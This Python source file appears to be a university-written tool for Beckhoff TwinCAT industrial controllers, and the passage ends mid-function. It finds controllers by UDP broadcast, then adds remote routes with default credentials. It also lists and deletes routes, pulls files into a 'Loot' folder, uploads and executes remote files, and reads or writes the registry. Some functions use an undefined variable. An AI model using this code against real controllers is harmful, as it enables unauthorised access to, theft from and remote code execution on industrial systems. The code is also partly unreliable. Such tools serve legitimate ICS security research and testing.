#!/usr/bin/python3
# -*- coding: utf-8 -*-
'''
	Copyright 2021 Photubias(c)

	Written for Howest(c) University College, Ghent University, IC4

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.
        
        File name BeckhoffScan.py
        written by tijl[dot]deneut[at]howest[dot]be for www.ic4.be
        --- Beckhoff UDP Scanner ---
        It will perform a UDP discovery scan for Beckhoff devices (and software?)
        and then lists their info
'''
import os, binascii, socket, subprocess, time, re, random, datetime
_iTimeout = 1 ## Seconds, default waittime for answers
_boolPwnMode = False
_boolReachable = False
_iRNETPORT = 10000 ## Always same Remote AMS Net Port
_iLNETPORT = 31337 ## Random Local AMS Net port

def send_and_recv(s, packet):
    data = binascii.unhexlify(packet.replace(' ','')) ## TODO
    s.send(data)
    return s.recv(4096)

def send_only(s, ip, port, string):
    data = binascii.unhexlify(string.replace(' ',''))
    s.sendto(data, (ip, port))

def recv_only(s):
    data, addr = s.recvfrom(1024)
    return data, addr

def reverseByte(xInputData): ## Will return input b'12345678' as b'78563412' and '12345678' as '78563412'
    if isinstance(xInputData, bytes): return b''.join([xInputData[x:x+2] for x in range(0,len(xInputData),2)][::-1])
    else: return ''.join([xInputData[x:x+2] for x in range(0,len(xInputData),2)][::-1])

def getNetIDAsString(sHexNetID):
    sNetID = ''
    for i in range (0, len(sHexNetID), 2): sNetID += str(int(sHexNetID[i:i+2], 16)) + '.'
    if len(sNetID) > 0: sNetID = sNetID[:-1]
    return sNetID

def constructAMSPacket(sRNETID, sLNETID, iCmdID, lstADSData = [], sInvokeID = None, boolRequest = True):
    ## Example: '0a323c160101', c0a832010101, 9, True, [133, 1, 324, 'C:\\\\*.*\x00']
    ##   which will become packet 0000 38000000 0a323c160101 1027 c0a832010101 697a 0900 0400 18000000 00000000 46090000 85000000 01000000 44010000 08000000 433a5c5c2a2e2a00
    ##  AMS = 0000 cbData TargetNETID TargetNETPort SenderNETID SenderNETPort CmdID StateFlag cbDataLength AMSErrorCode InvokeID cbDataLength Data
    sRNETPORT = reverseByte(hex(_iRNETPORT)[2:].zfill(4))
    sLNETPORT = reverseByte(hex(_iLNETPORT)[2:].zfill(4))
    sCmdID = reverseByte(hex(iCmdID)[2:].zfill(4))
    iStateFlag = 4 if boolRequest else 5
    sStateFlag = reverseByte(hex(iStateFlag)[2:].zfill(4))
    ## Construct ADS Data (depends on cmdID)
    sADSData = ''
    if iCmdID == 0: # ADS login/discovery
        raise Exception('Not (yet) implemented')
    elif iCmdID == 1: # ADS Read Device Info
        raise Exception('Not (yet) implemented')
    elif iCmdID == 2: # ADS Read
        if len(lstADSData) != 3: raise Exception('ADS parameter length mismatch')
        ## ADS Read requires indexgroup (int), indexoffset (int) and readsize (int)
        ##   indexgroup = 0, indexoffset = 0, Datalength = 1024
        sADSData = reverseByte(hex(lstADSData[0])[2:].zfill(8)) + reverseByte(hex(lstADSData[1])[2:].zfill(8)) + reverseByte(hex(lstADSData[2])[2:].zfill(8))
    elif iCmdID == 3: # ADS Write
        if len(lstADSData) != 3: raise Exception('ADS parameter length mismatch')
        ## ADS Read requires indexgroup (int), indexoffset (int), datalength (int) and Data (string)
        ##   indexgroup = 0, indexoffset = 0, Data = ''
        sWriteData = lstADSData[2].hex() if isinstance(lstADSData[2], bytes) else lstADSData[2].encode().hex()
        sADSData = reverseByte(hex(lstADSData[0])[2:].zfill(8)) + reverseByte(hex(lstADSData[1])[2:].zfill(8)) + reverseByte(hex(int(len(sWriteData)/2))[2:].zfill(8)) + sWriteData
    elif iCmdID == 4: # ADS Read State
         if len(lstADSData) != 0: raise Exception('ADS parameter length mismatch')
         sADSData = ''
    elif iCmdID == 5: # ADS Write Control
        if len(lstADSData) != 3: raise Exception('ADS parameter length mismatch')
        ## ADS Write Control requires ADSstate (int), DeviceState (int), datalength (int) and Data (string)
        ##   ADSState = 0, DeviceState = 0, Data = ''
        sWriteData = lstADSData[2].hex() if isinstance(lstADSData[2], bytes) else lstADSData[2].encode().hex()
        sADSData = reverseByte(hex(lstADSData[0])[2:].zfill(4)) + reverseByte(hex(lstADSData[1])[2:].zfill(4)) + reverseByte(hex(int(len(sWriteData)/2))[2:].zfill(8)) + sWriteData
    elif iCmdID == 6: # ADS Add device notification
        raise Exception('Not (yet) Implemented')
    elif iCmdID == 7: # ADS Delete device notification
        raise Exception('Not (yet) Implemented')
    elif iCmdID == 8: # ADS Device notification
        raise Exception('Not (yet) Implemented')
    elif iCmdID == 9: # ADS ReadWrite
        if len(lstADSData) != 4: raise Exception('ADS parameter length mismatch')
        ## ADS ReadWrite requires indexgroup (int), indexoffset (int), datalength-to-read (int), datalength-to-write (int), data-to-write (string)
        ##  indexgroup = 0, indexoffset = 0, cbReadlength = 0, Data = ''
        sWriteData = lstADSData[3].hex() if isinstance(lstADSData[3], bytes) else lstADSData[3].encode().hex()
        sADSData = reverseByte(hex(lstADSData[0])[2:].zfill(8)) + reverseByte(hex(lstADSData[1])[2:].zfill(8)) + reverseByte(hex(lstADSData[2])[2:].zfill(8)) + reverseByte(hex(int(len(sWriteData)/2))[2:].zfill(8)) + sWriteData
    else: raise Exception('CmdID out of range')
    ##  AMS = 0000 cbData TargetNETID TargetNETPort SenderNETID SenderNETPort CmdID StateFlag cbDataLength AMSErrorCode InvokeID cbDataLength Data
    sADSDataLength = reverseByte(hex(int(len(sADSData)/2))[2:].zfill(8))
    if not sInvokeID: sInvokeID = hex(random.randint(0,0xffffffff))[2:].zfill(8) ## Random InvokeID
    sAMSData = sRNETID + sRNETPORT + sLNETID + sLNETPORT + sCmdID + sStateFlag + sADSDataLength + '0'*8 + reverseByte(sInvokeID) + sADSData
    sAMSDataLength = reverseByte(hex(int(len(sAMSData)/2))[2:].zfill(8))
    return '0'*4 + sAMSDataLength + sAMSData

def parseAMSResponse(bResponse):
    sResponse = bResponse.hex()
    if not sResponse[:4] == '0000': raise Exception('Error: Response seems malformed, first 2 bytes: {}'.format(sResponse[:4]))
    iPacketLength =  int(reverseByte(sResponse[4:12]), 16)
    sAMSDstNetID = sResponse[12:24]
    iAMSDstNetPort = int(reverseByte(sResponse[24:28]), 16)
    sAMSSrcNetID = sResponse[28:40]
    iAMSSrcNetPort = int(reverseByte(sResponse[40:44]), 16)
    iCmdID = int(reverseByte(sResponse[44:48]), 16)
    iStateFlags = int(reverseByte(sResponse[48:52]), 16)
    iADSDataLength = int(reverseByte(sResponse[52:60]), 16)*2
    sErrorCode = reverseByte(sResponse[60:68])
    sInvokeID = reverseByte(sResponse[68:76])
    sADSData = sResponse[76:76+iADSDataLength]
    lstAMSResponse = {
        'PacketLength':iPacketLength,
        'AMSDstNetID':sAMSDstNetID,
        'AMSDstPortID':iAMSDstNetPort,
        'AMSSrcNetID':sAMSSrcNetID,
        'AMSSrcNetPort':iAMSSrcNetPort,
        'CmdID':iCmdID,
        'StateFlags':iStateFlags,
        'ErrorCode':sErrorCode,
        'InvokeID':sInvokeID,
        'ADSData':sADSData
    }
    return lstAMSResponse

def parseADSResponse(sADSData):
    sErrorCode = reverseByte(sADSData[0:8])
    if len(sADSData) == 8: return {'ErrorCode':sErrorCode,'ADSData':''}
    iDataLength = int(reverseByte(sADSData[8:16]), 16)*2
    sADSData = sADSData[16:16+iDataLength]
    return {'ErrorCode':sErrorCode,'ADSData':sADSData}

def selectInterface(): #adapter[] = npfdevice, ip, mac
    def getAllInterfaces(): 
        lstInterfaces=[]
        if os.name == 'nt':
            proc = subprocess.Popen('getmac /NH /V /FO csv | FINDSTR /V disconnected', shell=True, stdout=subprocess.PIPE)
            for bInterface in proc.stdout.readlines():
                lstInt = bInterface.split(b',')
                sAdapter = lstInt[0].strip(b'"').decode()
                sDevicename = lstInt[1].strip(b'"').decode()
                sMAC = lstInt[2].strip(b'"').decode().lower().replace('-', ':')
                sWinguID = lstInt[3].strip().strip(b'"').decode()[-38:]
                proc = subprocess.Popen('netsh int ip show addr "{}" | FINDSTR /I IP'.format(sAdapter), shell=True, stdout=subprocess.PIPE)
                
                try: sIP = re.findall(r'[0-9]+(?:\.[0-9]+){3}', proc.stdout.readlines()[0].strip().decode())[0]
                except: sIP = ''
                if len(sMAC) == 17: lstInterfaces.append([sAdapter, sIP, sMAC, sDevicename, sWinguID]) # When no or bad MAC address (e.g. PPP adapter), do not add
        else:
            proc = subprocess.Popen('for i in $(ip address | grep -v "lo" | grep "default" | cut -d":" -f2 | cut -d" " -f2);do echo $i $(ip address show dev $i | grep "inet " | cut -d" " -f6 | cut -d"/" -f1) $(ip address show dev $i | grep "ether" | cut -d" " -f6);done', shell=True, stdout=subprocess.PIPE)
            for bInterface in proc.stdout.readlines():
                lstInt = bInterface.strip().split(b' ')
                try: 
                    if len(lstInt[2]) == 17: lstInterfaces.append([lstInt[0].decode(), lstInt[1].decode(), lstInt[2].decode(), '', ''])
                except: pass
        return lstInterfaces
    
    lstInterfaces = getAllInterfaces()
    i = 1
    for lstInt in lstInterfaces: #array of arrays: adapter, ip, mac, windows devicename, windows guID
        print('[{}] {} has {} ({})'.format(i, lstInt[2], lstInt[1], lstInt[0]))
        i += 1
    if i > 2: sAnswer = input('[?] Please select the adapter [1]: ')
    else: sAnswer = None
    if not sAnswer or sAnswer == '' or not sAnswer.isdigit() or int(sAnswer) >= i: sAnswer = 1
    iAnswer = int(sAnswer) - 1
    sNPF = lstInterfaces[iAnswer][0]
    sIP = lstInterfaces[iAnswer][1]
    sMAC = lstInterfaces[iAnswer][2]
    if os.name == 'nt': sNPF = r'\Device\NPF_' + lstInterfaces[iAnswer][4]
    return (sNPF, sIP, sMAC)

def getDevices(LHOST, LNETID, _iTimeout):
    print('## Scanning for Devices on network {} '.format(LHOST))
    oSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    oSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    oSock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    oSock.settimeout(_iTimeout)
    oSock.bind((LHOST, 0))
    
    print('Sending the discovery packets and waiting {} seconds for answers...'.format(_iTimeout))
    send_only(oSock, '255.255.255.255', 48899, '03661471 0000000001000000' + LNETID + '1027 00000000')
    receivedData = []
    while True:
        try: receivedData.append(recv_only(oSock))
        except: break
    oSock.close()
    arrDevices=[]
    for data in receivedData:
        bData, lstIP = data
        bHexdata = bData.hex().encode()
        bNetID = bHexdata[24:36]
        iNamelength = int(bHexdata[54:56]+bHexdata[52:54],16)
        sName= bData[28:27+iNamelength].decode(errors='ignore')
        i = (27+iNamelength)*2 + 18
        sKernel = '{}.{}.{}'.format(int(reverseByte(bHexdata[i:i+8]),16), int(reverseByte(bHexdata[i+8:i+16]),16), int(reverseByte(bHexdata[i+16:i+24]),16))
        i = i+24+528
        
        try: sTwinCatVersion = '{}.{}.{}'.format(int(bHexdata[i:i+2], 16), int(bHexdata[i+2:i+4],16), int(reverseByte(bHexdata[i+4:i+8]),16))
        except: sTwinCatVersion = 'Unknown'
        #rest = bHexdata[i+8:] ##(extra data, new in TC3 4024, SSL Thumbprint)
        try: sThumbprint = bData.split(b'\x12\x00\x41\x00')[1].split(b'\x00')[0].decode(errors='ignore').upper()
        except: sThumbprint = None
        
        if sName != '': arrDevices.append({'IP':lstIP[0], 'NAME':sName, 'RNETID':bNetID.decode(), 'TCVER':sTwinCatVersion, 'WINVER':sKernel, 'SSLTHUMBPRINT':sThumbprint})
    return arrDevices ## Array of devices[ip, name, netID, twincatversion, kernel]

def getState(lstDevice, sLNETID):
    ## ADS Read State Request
    oSock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    oSock.connect((lstDevice['IP'], 48898))
    oSock.settimeout(_iTimeout)
    
    sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 4, ())
    try: resp = binascii.hexlify(send_and_recv(oSock, sPacket))
    except: resp = ''
    oSock.close()
    if len(resp)>0:
        if resp[-8:-6] == b'06': return 'STOP'
        elif resp[-8:-6] == b'0f': return 'CONFIG'
        else: return 'RUN'
    else:
        return 'ERROR'

def verifyDevice(lstDevice, LHOST, LNETID, boolNoPrint = False):
    os.system('cls' if os.name == 'nt' else 'clear')
    sState = getState(lstDevice, LNETID)

    if boolNoPrint:
        if sState == 'ERROR':
            print('Device seems unreachable using TCP, please add a route!')
            input('Press [Enter] to continue')
        return sState
    
    if sState == 'RUN':
        print('Device is reachable and Twincat is running')
    elif sState == 'CONFIG':
        print('Device is reachable and Twincat is in CONFIG mode')
    elif sState == 'STOP':
        print('Device is reachable and Twincat is stopped')
    else:
        print('Device unreachable. Please add remote route!')
        ans = input('Do you want to add one now? [y/N]: ').lower()
        if ans == 'y': addRoute(lstDevice, LHOST, LNETID)
        return sState
    input('Press [Enter] to continue')
    return sState

def addRoute(lstDevice, LHOST, LNETID):
    ## TODO: Once the device is reachable, authentication is not needed
    global _boolReachable
    os.system('cls' if os.name == 'nt' else 'clear')
    sUser = sPass = ''
    if _boolReachable:
        print('Device seems reachable, sure to add a route?')
        ans = input('Please type \'Y\' to do so [y/N]: ').lower()
        if not ans == 'y': return
    sUser = input('Device username [Administrator]: ')
    sPass = input('Device password [1]: ')
    if sUser == '': sUser = 'Administrator'
    if sPass == '': sPass = '1'
    print('\nAdding route on '+lstDevice['NAME']+' ('+lstDevice['IP']+')')
    sRoutename = socket.gethostname()
    ans = input('Use default route name ('+sRoutename+')? [Y/n]: ').lower()
    if ans == '': ans = 'y'
    if not ans == 'y': sRoutename = input('Please provide Route Name: ')
    udpsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udpsock.settimeout(_iTimeout)
    udpsock.bind((LHOST,0))
    ## This Route has same credentials (user/pass), but not encrypted:
    ##packet = '036614710000000006000000 ac1001200101 1027 050000000c001000 46494354494c452d5457494e43415400 07000600 ac1001200101 0d000500 7573657200 02000500 7061737300 05000c00 3137322e32302e302e353000'
    ##static, LNETID, static+length, hostname+nullbyte (FICTILE-TWINCAT), static, LNETID, static+length, user+nullbyte, static+length, pass+nullbyte, static+length, LHOST+nullbyte

    namelength=hex(1+len(sRoutename))[2:].zfill(2)
    routenamehex = sRoutename.encode().hex()
    userlength=hex(1+len(sUser))[2:].zfill(2)
    userhex = sUser.encode().hex()
    passlength=hex(1+len(sPass))[2:].zfill(2)
    passhex = sPass.encode().hex()
    lhostlength=hex(1+len(LHOST))[2:].zfill(2)
    lhosthex = LHOST.encode().hex()

    packet='036614710000000006000000'+LNETID+'1027050000000c00'+namelength+'00'+routenamehex+'00 07000600'+LNETID
    packet+='0d00'+userlength+'00'+userhex+'00 0200'+passlength+'00'+passhex+'00 0500'+lhostlength+'00'+lhosthex+'00'
   
    print('Adding route {} for {} with credentials {}/{}'.format(sRoutename, LHOST, sUser, sPass))
    send_only(udpsock, lstDevice['IP'], 48899, packet)
    resp, host = recv_only(udpsock)
    hexdata = binascii.hexlify(resp)
    sAmsnetID = '{}.{}.{}.{}.{}.{}'.format(int(hexdata[24:26],16), int(hexdata[26:28],16), int(hexdata[28:30],16), int(hexdata[30:32],16), int(hexdata[32:34],16), int(hexdata[34:36],16))
    udpsock.close()
    print('Received AMS Net ID: ' + sAmsnetID)
    if resp[-4:] == b'\x00' * 4: print('[+] Succes, route should be added')
    else: print('[-] Failure, wrong credentials?')
    if getState(lstDevice, LNETID) == 'ERROR': _boolReachable = False
    else: _boolReachable = True
    input('Press [Enter] to continue')
    return

def getRemoteRoutes(oSock, lstDevice, LNETID, showme = True):
    ## Just keep requesting routes untill there is no answer
    lstRoutes = []
    iAttempt = 5 ## This sometimes ends prematurely (no responses), attempting it 5 times
    iRouteIndex = 0
    while iRouteIndex >= 0:
        ## RouteID, first route is '0', second is '1' etc...
        sInvokeID = hex(random.randint(0,0xffffffff))[2:].zfill(8) ## Always 8 characters (4bytes), used for parsing
        #packet = '0000 2c000000 {} 1027 {} 9f80 0200 0400 0c000000 00000000 {} 23030000 {}000000 00080000'.format(lstDevice['RNETID'], LNETID, sInvokeID, sRouteID)
        sPacket = constructAMSPacket(lstDevice['RNETID'], LNETID, 2, [803, iRouteIndex, 2048], sInvokeID)
        ## 0x323 (803) is indexgroup, iRouteIndex is offset and 0x800 (2048) is the size of the data to receive
        
        try: 
            bResp = send_and_recv(oSock, sPacket)
        except:
            if iAttempt > 0 and iRouteIndex == 0: iAttempt -= 1
            else: iRouteIndex = -1
        
        ## Parse the route
        try: lstAMSResponse = parseAMSResponse(bResp)
        except: lstAMSResponse = parseAMSResponse(recv_only(oSock)[0]) ## Todo: Older devices send two responses instead of one
        if not lstAMSResponse['ErrorCode'] == '00000000': raise Exception('[-] Error receiving route, error code: {}'.format(lstAMSResponse['ErrorCode']))
        if not lstAMSResponse['InvokeID'] == sInvokeID:  ## Todo: Older devices send two responses instead of one
            lstAMSResponse = parseAMSResponse(recv_only(oSock)[0])
        try: lstADSData = parseADSResponse(lstAMSResponse['ADSData']) ## Todo: Older devices send two responses instead of one
        except: lstADSData = parseADSResponse(parseAMSResponse(recv_only(oSock)[0])['ADSData'])
        if not lstADSData['ErrorCode'] == '00000000': 
            if lstADSData['ErrorCode'] == '00000716': ## This code means "no more routes found"
                iRouteIndex = -1 
                continue
            raise Exception('[-] Error in ADS response, error code: {}'.format(lstADSData['ErrorCode']))
        sADSData = lstADSData['ADSData']
        sNetID = getNetIDAsString(sADSData[:12])
        sData = sADSData[64:]
        iIPLength = int(reverseByte(sData[:8]), 16)*2
        iNameLength = int(reverseByte(sData[8:16]), 16)*2
        sData = sData[24:]
        sAddress = bytes.fromhex(sData[:iIPLength]).decode().strip('\x00')
        sRouteName = bytes.fromhex(sData[iIPLength:iIPLength+iNameLength]).decode().strip('\x00')
        if showme: print('NetID = {}, Address = {}, Name = {}'.format(sNetID, sAddress, sRouteName))
        lstRoutes.append((sRouteName, sAddress, sNetID))
        iRouteIndex += 1
    return lstRoutes

def delRoute(lstDevice, LHOST, LNETID):
    os.system('cls' if os.name == 'nt' else 'clear')
    global _boolReachable
    if getState(lstDevice, LNETID) == 'ERROR':
        print('Device unreachable. Please add remote route!')
        input('[!] Press [Enter] to continue')
        return
    
    oSock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    oSock.connect((lstDevice['IP'],48898))
    oSock.settimeout(_iTimeout)
    bMyRoute = False

    print('Hold on, receiving...')
    time.sleep(1)
    os.system('cls' if os.name == 'nt' else 'clear')
    arrRouteNames = getRemoteRoutes(oSock, lstDevice, LNETID, False)
    i = 1
    for route in arrRouteNames:
        print('[{}] {} ({})'.format(i, route[0], route[1]))
        i += 1
    print('[C] Cancel')
    sAnswer = input('Which route to delete? [C]: ')
    if sAnswer == '' or not sAnswer.isdigit() or int(sAnswer)>=i:
        oSock.close()
        return
    
    if arrRouteNames[int(sAnswer)-1][1] == LHOST:
        bMyRoute = True
        sAns = input('Deleting your own route will result in connection failure, sure? [y/N]: ').lower()
        if not sAns == 'y':
            oSock.close()
            return
    
    sRoutename = arrRouteNames[int(sAnswer)-1][0]
    print('\n[!] Deleting Route: {}'.format(sRoutename))

    sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 3, (802, 0, sRoutename + '\x00'))
    
    try:
        resp = send_and_recv(oSock, sPacket)
        oSock.close()
        if bMyRoute:
            if getState(lstDevice, LNETID)=='ERROR': print('Successful!')
            else: print('There was an error')
        else:
            if resp[-4:].hex() == '00000000': print('Successful!')
            else: print('Some error occured')
    except:
        oSock.close()
        print('Something went wrong!')
    if getState(lstDevice, LNETID) == 'ERROR': _boolReachable = False
    else: _boolReachable = True
    input('[!] Press [Enter] to continue')
    return

def getInfo(lstDevice, sLHOST, LNETID):
    os.system('cls' if os.name == 'nt' else 'clear')
    state = verifyDevice(lstDevice, sLHOST, LNETID, True)
    if state == 'ERROR': return

    if lstDevice['TCVER'].startswith('2'): print('This device uses Twincat 2, only basic details are shown')

    print('      ###--- DEVICE INFO ---###')        
    oSock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    oSock.settimeout(_iTimeout)
    oSock.connect((lstDevice['IP'], 48898))

    if lstDevice['TCVER'].startswith('3'):
        import xml.etree.ElementTree as ET
        ##ADS Read Request (indexgroup 0x2bc, offset 0x1, data 4 to get datalength, datalength to get the data)
        sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 2, (700, 1, 4))
        bResp = send_and_recv(oSock, sPacket)
        iResponseLength = int(reverseByte(parseADSResponse(parseAMSResponse(bResp)['ADSData'])['ADSData']),16)

        sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 2, (700, 1, iResponseLength))
        ## Has: TargetType, TargetVersion (Version, Revision, Build), TargetFeatures (NetID), Hardware (Model, SerialNo, CPUVersion, Date, CPUArchitecture)
        ##        OsImage (ImageDevice, ImageVersion, ImageLevel, OsName, OsVersion)
        ## Example:
        ## <TargetType>CB3011-0001-M9002215923-001-CE</TargetType>
        ## <TargetVersion><Version>3</Version><Revision>1</Revision><Build>4018</Build></TargetVersion>
        ## <TargetFeatures><NetID>5.35.18.112.1.1</NetID></TargetFeatures>
        ## <Hardware><Model>CB3011-0001-M900</Model><SerialNo>2215923-001</SerialNo><CPUVersion>2.2</CPUVersion><Date>25.11.15</Date><CPUArchitecture>5</CPUArchitecture></Hardware>
        ## <OsImage><ImageDevice>CB3011</ImageDevice><ImageVersion>6.02e</ImageVersion><ImageLevel>HPS</ImageLevel><OsName>Windows CE</OsName><OsVersion>7.0</OsVersion></OsImage>
        sXMLData = parseADSResponse(parseAMSResponse(send_and_recv(oSock, sPacket))['ADSData'])['ADSData']
        bXMLData = bytes.fromhex(sXMLData).strip(b'\x00')
        
        try:
            root = ET.fromstring(bXMLData)

            print('TargetType: '+root[0].text)
            print('TargetVersion: '+root[1][0].text+'.'+root[1][1].text+'.'+root[1][2].text)
            print('TargetFeatures (NetID): '+root[2][0].text)
            print('Hardware: Model='+root[3][0].text+', Serial='+root[3][1].text+', Version='+root[3][2].text+', Date='+root[3][3].text+', Architecture='+root[3][4].text)
            print('OSImage: Device='+root[4][0].text+', Version='+root[4][1].text+', Level='+root[4][2].text+', OsName='+root[4][3].text+', OsVersion='+root[4][4].text)
            print()
        except:
            pass
    print('OS Version: '+lstDevice['WINVER'])
    if lstDevice['SSLTHUMBPRINT']: print('SSL Thumbprint: {}'.format(lstDevice['SSLTHUMBPRINT']))
    #if(len(device['NAME'])>8):
    #    print('Based on the devicename ({}), '.format(device['NAME']))
    #    print('   the MAC Address could be: 00-01-05-{}-{}-{}'.format(device['NAME'][-6:-4], device['NAME'][-4:-2], device['NAME'][-2:]))
    print()
    print('      ###--- DEVICE REMOTE ROUTES ---###')
    getRemoteRoutes(oSock, lstDevice, LNETID)
    print()
    oSock.close()
    sState = getState(lstDevice, LNETID)
    print('      ###--- TWINCAT SERVICE ---###')
    print('Twincat version: {}'.format(lstDevice['TCVER']))
    print('Twincat is currently in {} mode'.format(sState))
    print()
    input('[!] Press [Enter] to continue')

def downloadFile(lstDevice, sLNETID, oSock, sPath, sFileName):
    ## ToDo: does only works for small files that do not contain \x0d\x0a
    ## ## Seems to have issues with bytes \x0d\x0a (is being replaced by \x0a)
    sDownloadFolder = os.path.join('Loot', lstDevice['IP'])
    sDownloadPath = os.path.join(sDownloadFolder, sFileName)
    print('[+] Downloading to {}'.format(sDownloadPath))
    sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 9, (120, 1, 4, sPath + sFileName))
    sResp = send_and_recv(oSock, sPacket)
    sADSData = parseADSResponse(parseAMSResponse(sResp)['ADSData'])['ADSData']
    if not sADSData: raise Exception('[-] Error, downloading folders is not supported')
    iOffset = int(reverseByte(sADSData), 16)
    if os.path.exists(sDownloadPath): 
        sAns = input('[!] Error, file {} already exists, want to overwrite [y/N]: '.format(sFileName)).lower()
        #sAns='y'
        if sAns == 'y': os.remove(sDownloadPath)
        else: return
    if not os.path.exists(sDownloadFolder): os.makedirs(sDownloadFolder)
    sFile = open(sDownloadPath, 'wb')
    
    while True:
        #print('downloadfilepart')
        sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 9, (122, iOffset, 16384, ''))
        sResp = send_and_recv(oSock, sPacket) 
        #print(sResp.hex())
        sADSData = parseADSResponse(parseAMSResponse(sResp)['ADSData'])['ADSData']
        sFile.write(bytes.fromhex(sADSData))
        #print(sADSData)
        #print(len(sADSData))
        if len(sADSData) < 16384: break
    return True

def uploadFile(lstDevice, sLNETID, oSock, sLocalFilePath, sRemoteFilePath):
    if not os.path.exists(sLocalFilePath): raise Exception('[-] Error, file {} not found'.format(sLocalFilePath))
    bLocalFileData = open(sLocalFilePath, 'rb').read()
    sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 9, (120, 65618, 4, sRemoteFilePath))
    sResp = send_and_recv(oSock, sPacket)
    sADSData = parseADSResponse(parseAMSResponse(sResp)['ADSData'])['ADSData']
    iOffset = int(reverseByte(sADSData), 16)
    for i in range(0, len(bLocalFileData), 16384):
        bFilePart = bLocalFileData[i:]
        if len(bFilePart) > 16384: bFilePart = bFilePart[:16384]
        sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 9, (123, iOffset, 0, bFilePart))
        sResp = send_and_recv(oSock, sPacket)
        print('[+] Sending bytes {} / {}'.format(len(bFilePart)+i,len(bLocalFileData)))
    sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 9, (121, iOffset, 0, ''))
    send_and_recv(oSock, sPacket)
    return True

def getDirContent(lstDevice, sLNETID, oSock, sPath):
    def convertToDate(iTimestamp):
        sDateTime = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=int(iTimestamp/10))
        return sDateTime.strftime('%d/%m/%Y %H:%M')
    sFiles = []
    iOffset = 1
    sPath += r'\*.*'
    while True:
        if iOffset == 1: sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 9, (133, iOffset, 2048, sPath))
        else: sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 9, (133, iOffset, 2048, ''))
        ## 133 is indexgroup, 1 is indexoffset, readsize is 2048
        sResp = send_and_recv(oSock, sPacket)
        sFileData = parseADSResponse(parseAMSResponse(sResp)['ADSData'])['ADSData']
        if len(sFileData) > 0:
            iOffset = int(reverseByte(sFileData[:8]), 16)
            lstFileInfo = {
                'FileName':bytes.fromhex(sFileData[96:]).split(b'\x00')[0].decode(errors='ignore'),
                'FileAttr':sFileData[8:16], ## Details: https://infosys.beckhoff.com/english.php?content=../content/1033/tcplclibutilities/html/TcPlcLibUtilities_ST_FileAttributes.htm&id=
                'CreationTime':convertToDate(int(reverseByte(sFileData[24:32]) + reverseByte(sFileData[16:24]), 16)),
                'LastAccessTime':convertToDate(int(reverseByte(sFileData[40:48]) + reverseByte(sFileData[32:40]), 16)),
                'LastWriteTime':convertToDate(int(reverseByte(sFileData[56:64]) + reverseByte(sFileData[48:56]), 16)),
                'FileSize': int(reverseByte(sFileData[74:72]) + reverseByte(sFileData[72:80]), 16), ## Filesize 0 == Directory
                'File': False if int(reverseByte(sFileData[72:80]) + reverseByte(sFileData[64:72]), 16) == 0 else True
            }
            sFiles.append(lstFileInfo)
        else: break
    return sFiles

def executeRemoteFile(lstDevice, sLNETID, oSock, sFilePath, sPath, sParams):
    bFilePathLength = bytes.fromhex(reverseByte(hex(len(sFilePath))[2:].zfill(8)))
    bPathLength = bytes.fromhex(reverseByte(hex(len(sPath))[2:].zfill(8)))
    bParamsLength = bytes.fromhex(reverseByte(hex(len(sParams))[2:].zfill(8)))
    sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 3, (500, 0, bFilePathLength + bPathLength + bParamsLength + sFilePath.encode() + b'\x00' + sPath.encode() + b'\x00' + sParams.encode() + b'\x00'))
    sResp = send_and_recv(oSock, sPacket)
    lstAMSResponse = parseAMSResponse(sResp)
    sErrorCode = reverseByte(lstAMSResponse['ADSData'])
    if not sErrorCode == '00000000': return False
    return True

def manageVariables(lstDevice, sLNETID):
    input('not yet implemented, feel free to buy me a coffee to help, press [enter]')
    return

def manageRegistry(lstDevice, sLNETID):
    os.system('cls' if os.name == 'nt' else 'clear')
    print('## All actions are on hive "HKLM"')
    #print('##  Since TwinCAT is still running as a 32-Bit process, all HKLM\\SOFTWARE keys will be stored/read as')
    #print('##    HKLM\\SOFTWARE\WOW6432Node')
    print('Read or Write a Registry Value?')
    print('[R] Read a value')
    print('[W] Write a value')
    sAnswer = input('\nAction [R]: ').lower()
    if not sAnswer == 'w': sAnswer = 'r'
    oSock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    oSock.settimeout(_iTimeout)
    oSock.connect((lstDevice['IP'], 48898))
    if sAnswer == 'r':
        print('  Paths are relative to HLKM\n')
        sRegPath = input('Path to open [SYSTEM\\CurrentControlSet\\Control\\SystemInformation]: ') or 'SYSTEM\\CurrentControlSet\\Control\\SystemInformation'
        sRegVar = input('Value to read [BIOSVersion]: ') or 'BIOSVersion'
        print('Attempting to read value {} from path HKLM\\{}'.format(sRegVar, sRegPath))
        sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 9, (200, 0, 2048, sRegPath + '\x00' + sRegVar))
        sData = parseADSResponse(parseAMSResponse(send_and_recv(oSock, sPacket))['ADSData'])['ADSData']
        print('\nResult: {}'.format(bytes.fromhex(sData).decode()))
        input('\nPress [Enter] to return')
    else:
